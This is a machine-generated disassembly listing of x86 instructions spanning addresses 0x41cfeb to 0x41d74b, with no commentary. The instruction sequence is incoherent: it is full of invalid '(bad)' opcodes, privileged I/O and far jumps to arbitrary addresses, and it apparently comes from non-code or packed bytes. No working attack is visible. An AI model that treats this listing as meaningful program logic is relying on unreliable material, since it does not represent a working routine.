  41cfeb:	mov    ah,0xb3
  41cfed:	mov    ecx,0xb6a1fd82
  41cff2:	push   0x505a7e85
  41cff7:	pop    eax
  41cff8:	xor    dl,BYTE PTR [esi+0x75067a1d]
  41cffe:	xchg   ebx,eax
  41cfff:	imul   eax,DWORD PTR [ebp+ebx*4-0x6998aa08],0x73
  41d007:	in     al,0x69
  41d009:	(bad)  
  41d00a:	xor    esi,DWORD PTR es:[bx+0x2b43]
  41d010:	pop    esi
  41d011:	jbe    0x41cffe
  41d013:	push   esi
  41d014:	sti    
  41d015:	pop    ds
  41d016:	jge    0x41d083
  41d018:	mov    dh,0x93
  41d01a:	mov    edi,0xea5196a8
  41d01f:	xchg   ecx,eax
  41d020:	inc    ebp
  41d021:	imul   eax,DWORD PTR [ebp+0x4637ee49],0xd22dd11c
  41d02b:	mov    eax,0x83c6a9cb
  41d030:	and    DWORD PTR [ecx-0x444453f],edi
  41d036:	add    dh,0xc0
  41d039:	pusha  
  41d03a:	and    al,0xeb
  41d03c:	clc    
  41d03d:	cmp    dh,BYTE PTR [edx+0x24a409cd]
  41d043:	jnp    0x41cffc
  41d045:	test   eax,0x2b3f40d8
  41d04a:	xor    ch,al
  41d04c:	push   es
  41d04d:	aaa    
  41d04e:	dec    DWORD PTR ds:0x3ce7607d
  41d054:	cmp    BYTE PTR [ebx+0x43025fc3],ch
  41d05a:	add    al,0xcc
  41d05c:	jl     0x41d0dd
  41d05e:	push   cs
  41d05f:	jl     0x41d0c9
  41d061:	aad    0xc5
  41d063:	sub    al,0x8a
  41d065:	adc    eax,DWORD PTR [edx-0xd]
  41d068:	fld    TBYTE PTR [ecx+0x3b]
  41d06b:	jg     0x41d0cb
  41d06d:	and    dl,dh
  41d06f:	stos   DWORD PTR es:[edi],eax
  41d070:	and    dl,dh
  41d072:	aam    0x11
  41d074:	lds    ebx,FWORD PTR [esi+ecx*4+0x27]
  41d078:	push   0x1
  41d07a:	test   al,0xb4
  41d07c:	or     cl,BYTE PTR [esi]
  41d07e:	mov    edx,0xb966f624
  41d083:	out    0x3e,al
  41d085:	loop   0x41d077
  41d087:	adc    BYTE PTR ds:0x12e531a6,bl
  41d08d:	jmp    0xa8b65961
  41d092:	or     eax,DWORD PTR [eax-0x12]
  41d095:	cld    
  41d096:	or     BYTE PTR [eax],dh
  41d098:	cmp    BYTE PTR [eax+0x10cd8f11],ah
  41d09e:	sbb    esp,edi
  41d0a0:	sbb    BYTE PTR [ecx],0xdc
  41d0a3:	fdiv   QWORD PTR [eax]
  41d0a5:	push   cs
  41d0a6:	js     0x41d100
  41d0a8:	jno    0x41d038
  41d0aa:	nop
  41d0ab:	mov    eax,ds:0x8310c7f5
  41d0b0:	les    eax,FWORD PTR [ebp+0x15af22a7]
  41d0b6:	lea    ecx,[ebx-0x2223bb6a]
  41d0bc:	push   es
  41d0bd:	lods   al,BYTE PTR ds:[esi]
  41d0be:	mov    al,0x15
  41d0c0:	inc    esp
  41d0c1:	mov    eax,ds:0x829fc2c5
  41d0c6:	loopne 0x41d120
  41d0c8:	nop
  41d0c9:	dec    esp
  41d0ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0cb:	dec    ecx
  41d0cc:	mov    edx,0x4de6b770
  41d0d1:	add    cl,BYTE PTR [ecx+0x41]
  41d0d4:	sub    BYTE PTR [ebp-0x38],dl
  41d0d7:	dec    edx
  41d0d8:	xor    DWORD PTR [edx+0x22],edi
  41d0db:	mov    esi,0x74193a4
  41d0e0:	jp     0x41d0d6
  41d0e2:	mov    esp,0xdcde9e15
  41d0e7:	and    al,0xb9
  41d0e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0ea:	loopne 0x41d099
  41d0ec:	push   cs
  41d0ed:	mov    dl,0x57
  41d0ef:	jle    0x41d0d9
  41d0f1:	mov    al,ds:0xbff790e7
  41d0f6:	enter  0xe29d,0x31
  41d0fa:	inc    ebp
  41d0fb:	push   esp
  41d0fc:	pop    esi
  41d0fd:	std    
  41d0fe:	out    0x9,al
  41d100:	lock cli 
  41d102:	push   eax
  41d103:	adc    al,0x1a
  41d105:	push   ss
  41d106:	call   0xf70e:0x61a87b00
  41d10d:	sub    BYTE PTR [edx+eiz*1-0x746129f0],al
  41d114:	(bad)  
  41d116:	add    ecx,DWORD PTR [ebx]
  41d118:	popf   
  41d119:	and    eax,0x2ffa22b8
  41d11e:	icebp  
  41d11f:	sub    eax,0x38433b9d
  41d124:	add    ebx,DWORD PTR [edi-0xd]
  41d127:	std    
  41d128:	fidiv  WORD PTR [eax+0x6c9f0503]
  41d12e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d12f:	popa   
  41d130:	sbb    al,0x8f
  41d132:	pop    eax
  41d133:	(bad)  
  41d134:	push   ebp
  41d135:	mov    eax,ds:0x3205ef54
  41d13a:	movaps XMMWORD PTR [ebp+0x2b872f96],xmm0
  41d141:	repnz cmp bl,BYTE PTR [eax+ecx*4]
  41d145:	mov    eax,ds:0xe43dab29
  41d14a:	xor    edi,DWORD PTR [eax]
  41d14c:	inc    edi
  41d14d:	or     al,0xf4
  41d14f:	lods   eax,DWORD PTR ds:[esi]
  41d150:	add    BYTE PTR [edi],dh
  41d152:	xor    al,0x96
  41d154:	inc    esi
  41d155:	jno    0x41d19e
  41d157:	enter  0xc3aa,0x8b
  41d15b:	repz mov edi,0xd287f5bf
  41d161:	enter  0x94b3,0x57
  41d165:	add    al,0x8e
  41d167:	mov    dh,0x55
  41d169:	adc    dh,BYTE PTR [ecx]
  41d16b:	(bad)  
  41d16c:	rcr    dl,1
  41d16e:	icebp  
  41d16f:	fucomip st,st(2)
  41d171:	pusha  
  41d172:	xchg   DWORD PTR [edx],esp
  41d174:	or     edi,0xffffffee
  41d177:	pop    edi
  41d178:	cwde   
  41d179:	inc    eax
  41d17a:	pop    ebp
  41d17b:	mov    cl,bl
  41d17d:	div    BYTE PTR ds:0x10c133f8
  41d183:	js     0x41d11c
  41d185:	loop   0x41d10b
  41d187:	inc    esi
  41d188:	into   
  41d189:	ret    
  41d18a:	pop    ebx
  41d18b:	push   ecx
  41d18c:	iret   
  41d18d:	push   0x41
  41d18f:	and    edi,DWORD PTR [ebx]
  41d191:	dec    edx
  41d192:	dec    eax
  41d193:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d194:	xor    al,0x2e
  41d196:	mov    bl,0x66
  41d198:	push   0xffffffc2
  41d19a:	sub    esp,DWORD PTR [ebx]
  41d19c:	loope  0x41d16c
  41d19e:	mov    ds:0x6f9eaac2,al
  41d1a3:	ror    BYTE PTR [eax-0x16],cl
  41d1a6:	xchg   esi,eax
  41d1a7:	fisttp DWORD PTR [ebp-0x4a]
  41d1aa:	mov    ch,0x75
  41d1ac:	inc    edx
  41d1ad:	add    BYTE PTR [ebx+0x1b],ch
  41d1b0:	test   al,0xa5
  41d1b2:	pushf  
  41d1b3:	jle    0x41d21f
  41d1b5:	gs jecxz 0x41d1f0
  41d1b8:	dec    ebx
  41d1b9:	cmp    DWORD PTR [edx-0x454afdad],esi
  41d1bf:	fcom   st(6)
  41d1c1:	cs out 0x90,al
  41d1c4:	in     eax,0xf9
  41d1c6:	mov    ch,0xb9
  41d1c8:	(bad)  
  41d1c9:	push   0xecf9bc07
  41d1ce:	dec    edi
  41d1cf:	inc    eax
  41d1d0:	mov    dl,0x14
  41d1d2:	test   al,0x1c
  41d1d4:	push   ecx
  41d1d5:	pop    ds
  41d1d6:	pop    ds
  41d1d7:	ins    BYTE PTR es:[edi],dx
  41d1d8:	push   ebx
  41d1d9:	jae    0x41d1d7
  41d1db:	sub    BYTE PTR [ebp-0x5956aa62],0x89
  41d1e2:	inc    ebp
  41d1e3:	jp     0x41d178
  41d1e5:	mov    dh,BYTE PTR [ecx+0x74]
  41d1e8:	ss pop ecx
  41d1ea:	xchg   ebx,eax
  41d1eb:	pop    edi
  41d1ec:	lock inc edi
  41d1ee:	lods   eax,DWORD PTR ds:[esi]
  41d1ef:	cmp    DWORD PTR [edx],edi
  41d1f1:	(bad)  
  41d1f2:	fsubr  QWORD PTR [ecx+edx*8]
  41d1f5:	imul   ebx,DWORD PTR [esi],0xc50678b6
  41d1fb:	cld    
  41d1fc:	cld    
  41d1fd:	xor    DWORD PTR [esp+ecx*8+0x41b60373],ebx
  41d204:	cmp    BYTE PTR [edi+0x4c2edefd],dh
  41d20a:	mov    esp,0xc3264b44
  41d20f:	fnsave [ebp+eax*1-0xc9e146c]
  41d216:	mov    ebp,0xf338e659
  41d21b:	popa   
  41d21c:	outs   dx,BYTE PTR ds:[esi]
  41d21d:	dec    eax
  41d21e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d21f:	pushf  
  41d220:	std    
  41d221:	loopne 0x41d28a
  41d223:	mov    ah,0xf1
  41d225:	mov    eax,0x814b29ab
  41d22a:	cwde   
  41d22b:	sbb    esp,DWORD PTR [esp+edx*8-0x69]
  41d22f:	cmp    esi,ebp
  41d231:	inc    ecx
  41d232:	sbb    DWORD PTR [esi+0x50],ebp
  41d235:	sahf   
  41d236:	mov    eax,0xd75e8c09
  41d23b:	xchg   edx,eax
  41d23c:	jo     0x41d271
  41d23e:	add    bh,BYTE PTR [esp+esi*8-0x15e0272e]
  41d245:	pop    ecx
  41d246:	in     eax,0xd1
  41d248:	pop    esp
  41d249:	(bad)  
  41d24b:	fst    QWORD PTR [ebx]
  41d24d:	mov    ebx,0x32c88b9
  41d252:	add    DWORD PTR [eax],esp
  41d254:	ss (bad) 
  41d256:	bound  ecx,QWORD PTR [edx]
  41d258:	call   0xfe36ae87
  41d25d:	sub    ecx,DWORD PTR [edx+0x36]
  41d260:	add    DWORD PTR [esi+0x78],ecx
  41d263:	push   0xffffffde
  41d265:	and    BYTE PTR [ecx],cl
  41d267:	xchg   ebp,eax
  41d268:	mov    dh,0x21
  41d26a:	repnz xchg ebx,eax
  41d26c:	pop    edx
  41d26d:	je     0x41d25b
  41d26f:	popa   
  41d270:	pop    ebx
  41d271:	cmp    al,ah
  41d273:	push   ds
  41d274:	sahf   
  41d275:	adc    BYTE PTR [ebx+eiz*2],0xa6
  41d279:	xchg   esi,eax
  41d27a:	ins    BYTE PTR es:[edi],dx
  41d27b:	pushf  
  41d27c:	push   edi
  41d27d:	inc    ebp
  41d27e:	cmp    al,0xe5
  41d280:	push   esi
  41d281:	add    cl,bh
  41d283:	sub    esp,ecx
  41d285:	popf   
  41d286:	mov    ecx,0xcb9dc690
  41d28b:	jbe    0x41d294
  41d28d:	push   esp
  41d28e:	iret   
  41d28f:	push   cs
  41d290:	imul   ebx,DWORD PTR cs:[ecx+0x47],0xffffffa7
  41d295:	xor    eax,0x8184240f
  41d29a:	sbb    al,0x1e
  41d29c:	mov    dl,0x1e
  41d29e:	mov    bh,0xcb
  41d2a0:	sub    dl,BYTE PTR [ebx]
  41d2a2:	mov    ah,BYTE PTR [edx+0x63c0b608]
  41d2a8:	loop   0x41d28c
  41d2aa:	sub    BYTE PTR [edi+0x4e],cl
  41d2ad:	shr    ecx,cl
  41d2af:	in     al,dx
  41d2b0:	iret   
  41d2b1:	pop    ecx
  41d2b2:	or     al,0xde
  41d2b4:	jae    0x41d26f
  41d2b6:	push   eax
  41d2b7:	jns    0x41d28f
  41d2b9:	test   eax,0x66e587f0
  41d2be:	call   0x86669a75
  41d2c3:	push   esi
  41d2c4:	loope  0x41d320
  41d2c6:	inc    edi
  41d2c7:	mov    eax,ds:0xd16f79bf
  41d2cc:	dec    esi
  41d2cd:	cwde   
  41d2ce:	pusha  
  41d2cf:	xchg   edi,eax
  41d2d0:	data16 jne 0x41d2a7
  41d2d3:	test   ebx,edx
  41d2d5:	dec    edi
  41d2d6:	ret    
  41d2d7:	shr    DWORD PTR [eax-0x572a3f68],cl
  41d2dd:	in     eax,dx
  41d2de:	and    DWORD PTR [edx],ecx
  41d2e0:	loope  0x41d33d
  41d2e2:	shl    DWORD PTR [edi],cl
  41d2e4:	xchg   DWORD PTR [eax-0x74],ebp
  41d2e7:	cmp    ebx,DWORD PTR [eax+0x2f]
  41d2ea:	mov    esp,0x1c72d75a
  41d2ef:	or     al,BYTE PTR [ebx]
  41d2f1:	mov    cs,WORD PTR [eax+ecx*8-0x11e2edaf]
  41d2f8:	xchg   edi,eax
  41d2f9:	test   DWORD PTR [ecx],ebx
  41d2fb:	mov    ebp,0x8303aa43
  41d300:	shr    DWORD PTR [ecx+0x315a7e91],0x98
  41d307:	adc    eax,0x96d7fc38
  41d30c:	sbb    DWORD PTR [edi-0x12],ebx
  41d30f:	add    eax,DWORD PTR [edi]
  41d311:	call   0x705c:0x9a879b50
  41d318:	xchg   esp,eax
  41d319:	imul   ecx,ebx,0x1a
  41d31c:	and    DWORD PTR [esi+edx*4-0xc],ebp
  41d320:	dec    esp
  41d321:	daa    
  41d322:	xchg   ecx,eax
  41d323:	popa   
  41d324:	out    0xb0,al
  41d326:	test   BYTE PTR [esi],dl
  41d328:	pop    eax
  41d329:	push   0x996c6628
  41d32e:	mov    al,ds:0x637032e1
  41d333:	adc    al,0x2a
  41d335:	das    
  41d336:	add    ecx,edi
  41d338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d339:	adc    DWORD PTR [ebx+0x71],edx
  41d33c:	out    0x5,eax
  41d33e:	xor    BYTE PTR [ecx+eax*8],ch
  41d341:	icebp  
  41d342:	push   es
  41d343:	(bad)  
  41d344:	jmp    DWORD PTR [eax]
  41d346:	das    
  41d347:	fdivrp st(4),st
  41d349:	pop    esi
  41d34a:	mov    WORD PTR [eax+0x4c],?
  41d34d:	push   0xe45dbd53
  41d352:	or     edi,DWORD PTR [edx]
  41d354:	inc    ecx
  41d355:	mov    ch,0xcc
  41d357:	and    cl,0x9e
  41d35a:	jmp    0x65c5:0x50bafde9
  41d361:	pop    ds
  41d362:	pusha  
  41d363:	sahf   
  41d364:	pop    ebp
  41d365:	lods   al,BYTE PTR ds:[esi]
  41d366:	xchg   DWORD PTR [ecx],ebp
  41d368:	pushf  
  41d369:	repnz mov bl,0xb7
  41d36c:	jmp    0x97ab:0x8bfb8a32
  41d373:	xchg   edi,eax
  41d374:	ret    0xec3
  41d377:	pop    ss
  41d378:	mov    bl,0xf4
  41d37a:	mov    dh,0xa4
  41d37c:	cmp    DWORD PTR ds:0xa24fd0e1,ebp
  41d382:	dec    esp
  41d383:	mov    ecx,0x103a1db8
  41d388:	jp     0x41d404
  41d38a:	dec    ecx
  41d38b:	pop    ebp
  41d38c:	invd   
  41d38e:	out    0x9a,eax
  41d390:	out    0x95,eax
  41d392:	adc    edi,DWORD PTR [ebx]
  41d394:	sub    dh,BYTE PTR [ecx+0x37b2b1de]
  41d39a:	jp     0x41d377
  41d39c:	bound  edx,QWORD PTR [eax+0x4e865245]
  41d3a2:	test   DWORD PTR [edx+eiz*2],ebx
  41d3a5:	cli    
  41d3a6:	shl    bl,0x31
  41d3a9:	fldcw  WORD PTR ds:0xa66464dd
  41d3af:	mov    ebx,0xf742eb8
  41d3b4:	je     0x41d381
  41d3b6:	push   esi
  41d3b7:	push   esi
  41d3b8:	pop    ebp
  41d3b9:	mov    DWORD PTR [ecx+0x4878b735],esi
  41d3bf:	leave  
  41d3c0:	inc    ebx
  41d3c1:	mov    ebp,DWORD PTR [esi-0x27]
  41d3c4:	inc    ebx
  41d3c5:	xchg   ebp,eax
  41d3c6:	out    dx,eax
  41d3c7:	loopne 0x41d395
  41d3c9:	sub    edx,DWORD PTR [ebx]
  41d3cb:	adc    DWORD PTR [eax+0x741bf92a],esi
  41d3d1:	stos   DWORD PTR es:[edi],eax
  41d3d2:	sbb    DWORD PTR [esi-0x54],eax
  41d3d5:	js     0x41d3bd
  41d3d7:	and    edx,ebx
  41d3d9:	out    0xa3,al
  41d3db:	add    BYTE PTR [edx+0x263f66cb],dh
  41d3e1:	mov    bh,0xc6
  41d3e3:	not    al
  41d3e5:	gs je  0x41d3c5
  41d3e8:	outs   dx,DWORD PTR ds:[esi]
  41d3e9:	shr    DWORD PTR [edi-0x43e5ee58],cl
  41d3ef:	cmc    
  41d3f0:	push   0x91aff50e
  41d3f5:	lods   al,BYTE PTR ds:[esi]
  41d3f6:	inc    edx
  41d3f7:	add    BYTE PTR [eax+eax*2],bl
  41d3fa:	sub    al,0x53
  41d3fc:	pushf  
  41d3fd:	mov    ds:0x71530723,al
  41d402:	(bad)  
  41d403:	jg     0x41d40b
  41d405:	imul   esi,DWORD PTR ds:0x6e96a75e,0x61d70e6c
  41d40f:	jle    0x41d43f
  41d411:	xor    DWORD PTR [edi+0x18],0x66
  41d415:	in     al,0xf5
  41d417:	jne    0x41d3e6
  41d419:	cmp    bh,BYTE PTR [esi-0x6f]
  41d41c:	mov    WORD PTR [esp+ecx*1],es
  41d41f:	imul   esi,DWORD PTR ds:0x11981d82,0x9020fa4b
  41d429:	mov    ch,0x7f
  41d42b:	je     0x41d3c6
  41d42d:	fisub  WORD PTR [edi]
  41d42f:	push   0x42
  41d431:	out    0xdb,eax
  41d433:	fistp  DWORD PTR [ebp+ebp*1-0x36]
  41d437:	cmp    DWORD PTR [ecx+0xcd5a735],esi
  41d43d:	and    esp,DWORD PTR [esi]
  41d43f:	ret    
  41d440:	imul   esp
  41d442:	setns  BYTE PTR [eax-0x36493beb]
  41d449:	ins    BYTE PTR es:[edi],dx
  41d44a:	hlt    
  41d44b:	sbb    DWORD PTR [edi+0x1e709b3c],eax
  41d451:	push   es
  41d452:	sub    al,0x9a
  41d454:	add    bl,ch
  41d456:	jecxz  0x41d427
  41d458:	xchg   edx,eax
  41d459:	and    eax,0xf272ac41
  41d45e:	jmp    0x11ee:0x6ccd600d
  41d465:	sbb    DWORD PTR [edi-0x1891b16e],ecx
  41d46b:	mov    WORD PTR [ecx+0x71],ss
  41d46e:	cwde   
  41d46f:	pop    edx
  41d470:	xchg   BYTE PTR ds:[edi+0x2e],al
  41d474:	ss cmp al,0x55
  41d477:	push   esi
  41d478:	push   0x6ed39d2
  41d47d:	jmp    0x41d459
  41d47f:	in     al,dx
  41d480:	rol    ebx,1
  41d482:	iret   
  41d483:	xor    esp,DWORD PTR [esi+0x70]
  41d486:	jb     0x41d45b
  41d488:	mov    dh,0x9e
  41d48a:	xchg   edx,eax
  41d48b:	add    al,0xb0
  41d48d:	bnd jae 0x41d4ce
  41d490:	test   al,0xb2
  41d492:	inc    esi
  41d493:	clc    
  41d494:	inc    ebp
  41d495:	div    BYTE PTR [edx+0x3d]
  41d498:	(bad)  
  41d49a:	xchg   esp,eax
  41d49b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d49c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d49d:	je     0x41d466
  41d49f:	and    al,0xf1
  41d4a1:	enter  0xe70b,0x26
  41d4a5:	fwait
  41d4a6:	adc    eax,0xa3dc6a8a
  41d4ab:	push   cs
  41d4ac:	push   ss
  41d4ad:	inc    ecx
  41d4ae:	xchg   esi,eax
  41d4af:	push   ebx
  41d4b0:	stos   DWORD PTR es:[edi],eax
  41d4b1:	inc    edi
  41d4b2:	mov    ch,0x61
  41d4b4:	add    DWORD PTR [ebx-0x3d],ebp
  41d4b7:	sub    bl,0x51
  41d4ba:	jb     0x41d482
  41d4bc:	push   0x476d42d1
  41d4c1:	mov    eax,0xcf94bc5e
  41d4c6:	retw   0x894b
  41d4ca:	cwde   
  41d4cb:	not    BYTE PTR [ebx]
  41d4cd:	push   0x6098b1d4
  41d4d2:	mov    esi,0x8922dcdf
  41d4d7:	and    dl,dh
  41d4d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4da:	dec    eax
  41d4db:	lock xchg ecx,eax
  41d4dd:	jnp    0x41d4ca
  41d4df:	into   
  41d4e0:	hlt    
  41d4e1:	arpl   WORD PTR [esi-0x1023c209],ax
  41d4e7:	(bad)  
  41d4e9:	out    0x2d,eax
  41d4eb:	les    ebp,FWORD PTR [ecx]
  41d4ed:	lds    ebx,FWORD PTR [edx-0x60]
  41d4f0:	xlat   BYTE PTR ds:[ebx]
  41d4f1:	jmp    0x41d4b2
  41d4f3:	adc    bl,BYTE PTR [esi+0x1a18c492]
  41d4f9:	push   edx
  41d4fa:	adc    eax,0x3ef474f2
  41d4ff:	ins    DWORD PTR es:[edi],dx
  41d500:	push   edx
  41d501:	push   eax
  41d502:	popf   
  41d503:	ja     0x41d4a7
  41d505:	jle    0x41d51e
  41d507:	ss adc eax,0x8e9b6c4
  41d50d:	add    al,0x1d
  41d50f:	add    esp,DWORD PTR [ecx]
  41d511:	sbb    DWORD PTR [edx-0x2c],eax
  41d514:	adc    bl,BYTE PTR [ebx]
  41d516:	ja     0x41d576
  41d518:	or     DWORD PTR [ecx-0x62],0x3b
  41d51c:	dec    eax
  41d51d:	pop    es
  41d51e:	inc    ebp
  41d51f:	pop    ss
  41d520:	adc    al,BYTE PTR ds:0xdb510133
  41d526:	push   ecx
  41d527:	push   esp
  41d528:	mov    bh,0x6
  41d52a:	sbb    al,0xa3
  41d52c:	scas   eax,DWORD PTR es:[edi]
  41d52d:	mov    esp,0x5349ea46
  41d532:	shr    DWORD PTR [esi-0x33d28017],1
  41d538:	xlat   BYTE PTR ds:[ebx]
  41d539:	push   es
  41d53a:	rcr    BYTE PTR ds:0x4c1f010e,cl
  41d540:	gs fwait
  41d542:	sbb    eax,0xa18f7dd3
  41d547:	mov    esp,0x1b92a558
  41d54c:	data16 xor al,0x9
  41d54f:	xchg   BYTE PTR [ecx+esi*8-0x5be570ca],bl
  41d556:	sub    al,0x5
  41d558:	pusha  
  41d559:	or     eax,0x9db5794d
  41d55e:	call   0x5c66:0x3e05b171
  41d565:	(bad)  
  41d567:	inc    ecx
  41d568:	cdq    
  41d569:	in     al,dx
  41d56a:	push   cs
  41d56b:	dec    edi
  41d56c:	mov    ch,0xf9
  41d56e:	js     0x41d5d0
  41d570:	fmul   DWORD PTR [esi-0x261cf04e]
  41d576:	dec    eax
  41d577:	sbb    DWORD PTR [esi+0xc],0xffffffa4
  41d57b:	mov    ah,0x1d
  41d57d:	loope  0x41d5ab
  41d57f:	adc    BYTE PTR [ebp-0x15f295a2],bh
  41d585:	test   al,0xcf
  41d587:	sub    esp,edi
  41d589:	outs   dx,DWORD PTR ds:[esi]
  41d58a:	sub    eax,0xfcb4296f
  41d58f:	mov    eax,0xd66edbea
  41d594:	inc    ecx
  41d595:	scas   al,BYTE PTR es:[edi]
  41d596:	leave  
  41d597:	int3   
  41d598:	lock push ss
  41d59a:	les    ebx,FWORD PTR [ebx+0x57d495ab]
  41d5a0:	xchg   edi,eax
  41d5a1:	inc    ebp
  41d5a2:	in     al,0x20
  41d5a4:	rol    DWORD PTR [eax],0x5c
  41d5a7:	push   esi
  41d5a8:	outs   dx,DWORD PTR ds:[esi]
  41d5a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5aa:	(bad)  
  41d5ab:	xchg   ebx,eax
  41d5ac:	add    al,dh
  41d5ae:	in     eax,dx
  41d5af:	cmp    DWORD PTR [edx-0x2abdc379],0xadad9cd1
  41d5b9:	mov    BYTE PTR [edi+0x0],al
  41d5bc:	arpl   WORD PTR [edi+ebp*4+0x39],sp
  41d5c0:	mov    WORD PTR [ebx],es
  41d5c2:	jmp    0x4757315b
  41d5c7:	mov    DWORD PTR [eax-0x9],0x68604f37
  41d5ce:	mov    ah,0x4
  41d5d0:	js     0x41d5b9
  41d5d2:	xchg   ebp,eax
  41d5d3:	sti    
  41d5d4:	inc    ebp
  41d5d5:	retf   
  41d5d6:	lock (bad) 
  41d5d8:	cld    
  41d5d9:	pushf  
  41d5da:	add    edx,DWORD PTR ds:0xbc220980
  41d5e0:	mov    bh,0x79
  41d5e2:	or     DWORD PTR [ecx],edx
  41d5e4:	cmp    eax,0x11abc6b1
  41d5e9:	das    
  41d5ea:	sbb    BYTE PTR [edx-0x4f],ch
  41d5ed:	fstp   DWORD PTR [ebp+ecx*1-0x46ae13e5]
  41d5f4:	push   eax
  41d5f5:	xlat   BYTE PTR ds:[ebx]
  41d5f6:	xor    bl,BYTE PTR [edi-0x4f]
  41d5f9:	fwait
  41d5fa:	jge    0x41d66f
  41d5fc:	xlat   BYTE PTR ds:[ebx]
  41d5fd:	xchg   esp,eax
  41d5fe:	lods   al,BYTE PTR ds:[esi]
  41d5ff:	sbb    DWORD PTR [ecx-0x3496f4a3],edi
  41d605:	test   al,0xed
  41d607:	mov    al,ds:0xac1ccced
  41d60c:	repz in al,0xd2
  41d60f:	xchg   ebp,eax
  41d610:	(bad)  
  41d611:	pop    esp
  41d612:	and    BYTE PTR [ebp+0x4f],ch
  41d615:	sbb    al,0xa5
  41d617:	xchg   edx,eax
  41d618:	ror    BYTE PTR [eax-0x5],0xdb
  41d61c:	mov    WORD PTR [eax-0x40],cs
  41d61f:	jl     0x41d5ff
  41d621:	mov    cl,0xb0
  41d623:	mov    edx,0x35b7a0ed
  41d628:	jge    0x41d61b
  41d62a:	mov    edi,0x7a4cf447
  41d62f:	push   cs
  41d630:	js     0x41d69a
  41d632:	sub    BYTE PTR [edx],cl
  41d634:	inc    ecx
  41d635:	xor    esp,DWORD PTR [ecx-0x1a]
  41d638:	and    BYTE PTR ds:0x9c426df3,bl
  41d63e:	push   ebp
  41d63f:	mov    ah,0x46
  41d641:	outs   dx,BYTE PTR ds:[esi]
  41d642:	out    0x16,eax
  41d644:	sub    al,0xfd
  41d646:	shl    BYTE PTR [edx],0xac
  41d649:	push   ebx
  41d64a:	or     eax,0x1b09266
  41d64f:	ss pop edx
  41d651:	inc    ebx
  41d652:	jns    0x41d6b8
  41d654:	push   ds
  41d655:	xchg   esi,eax
  41d656:	cs jno 0x41d672
  41d659:	dec    esp
  41d65a:	in     al,dx
  41d65b:	retf   0x6b26
  41d65e:	jno    0x41d6be
  41d660:	retf   
  41d661:	sbb    BYTE PTR [ebx+ebp*4+0x6c747367],ah
  41d668:	push   0xffffffbc
  41d66a:	inc    esp
  41d66b:	ffreep st(4)
  41d66d:	mov    edx,0x4e6d8f54
  41d672:	pusha  
  41d673:	add    dh,BYTE PTR [edi+0x6c]
  41d676:	daa    
  41d677:	adc    eax,0x5110acaf
  41d67c:	imul   ecx,edx,0x3362e050
  41d682:	xchg   ebx,eax
  41d683:	sbb    dl,BYTE PTR [esp+eiz*4-0xe]
  41d687:	fs or  al,0x2
  41d68a:	mov    esp,0x18efb96b
  41d68f:	pop    esi
  41d690:	mov    WORD PTR [edx+edx*2],cs
  41d693:	ins    BYTE PTR es:[edi],dx
  41d694:	xchg   edi,eax
  41d695:	jge    0x41d6b4
  41d697:	enter  0x4304,0xf6
  41d69b:	and    eax,0xa4d4c0f5
  41d6a0:	cld    
  41d6a1:	pusha  
  41d6a2:	popa   
  41d6a3:	and    edi,DWORD PTR [edx]
  41d6a5:	dec    ecx
  41d6a6:	jecxz  0x41d6f3
  41d6a8:	pop    ebp
  41d6a9:	pusha  
  41d6aa:	push   es
  41d6ab:	in     eax,dx
  41d6ac:	(bad)  
  41d6ad:	aas    
  41d6ae:	stos   DWORD PTR es:[edi],eax
  41d6af:	mov    edx,DWORD PTR [ecx]
  41d6b1:	repnz sahf 
  41d6b3:	xchg   ebx,eax
  41d6b4:	iret   
  41d6b5:	imul   al
  41d6b7:	or     bh,BYTE PTR [ebx]
  41d6b9:	ins    BYTE PTR es:[edi],dx
  41d6ba:	mov    eax,0xe36036
  41d6bf:	jb     0x41d71c
  41d6c1:	push   ebp
  41d6c2:	sub    BYTE PTR [ecx+0x76],dh
  41d6c5:	neg    DWORD PTR [ebx+0xa]
  41d6c8:	test   DWORD PTR [ebx-0x6e],edx
  41d6cb:	push   esp
  41d6cc:	mov    ebx,0x3e975698
  41d6d1:	inc    edi
  41d6d2:	mov    ecx,DWORD PTR [esi]
  41d6d4:	or     dh,BYTE PTR [ebp+0x2c]
  41d6d7:	jns    0x41d717
  41d6d9:	jae    0x41d6dd
  41d6db:	push   ecx
  41d6dc:	cwde   
  41d6dd:	adc    cl,BYTE PTR ds:[ebx]
  41d6e0:	pop    esp
  41d6e1:	test   DWORD PTR [ebp+0x28],edx
  41d6e4:	cvtpi2ps xmm2,QWORD PTR [edx+0x79754aec]
  41d6eb:	jmp    0xa9d05f09
  41d6f0:	or     edx,DWORD PTR [ebx+0x10]
  41d6f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6f4:	ja     0x41d751
  41d6f6:	lahf   
  41d6f7:	jnp    0x41d742
  41d6f9:	mov    ebx,0xdce4737a
  41d6fe:	sub    DWORD PTR [esi-0x238328e4],ebx
  41d704:	es pop eax
  41d706:	or     eax,edi
  41d708:	jecxz  0x41d771
  41d70a:	jne    0x41d6db
  41d70c:	outs   dx,BYTE PTR ds:[esi]
  41d70d:	fs push edx
  41d70f:	es pop esp
  41d711:	dec    edx
  41d712:	ficomp WORD PTR [edi-0x19]
  41d715:	cmp    al,0xff
  41d717:	aas    
  41d718:	fcomp  DWORD PTR [edx]
  41d71a:	add    ah,bl
  41d71c:	sahf   
  41d71d:	jg     0x41d6c0
  41d71f:	jge    0x41d6eb
  41d721:	dec    eax
  41d722:	mov    ss,eax
  41d724:	sub    BYTE PTR [edi],ah
  41d726:	push   edi
  41d727:	call   0x36056a48
  41d72c:	pushf  
  41d72d:	add    al,0x7f
  41d72f:	ret    0xe5eb
  41d732:	repz int 0x3e
  41d735:	xchg   esp,eax
  41d736:	popa   
  41d737:	call   0x3f834133
  41d73c:	or     eax,0x431f821e
  41d741:	or     edi,DWORD PTR [edx]
  41d743:	cmc    
  41d744:	cmp    BYTE PTR [ebp+0x3065d5d6],0x26
  41d74b:	sahf   
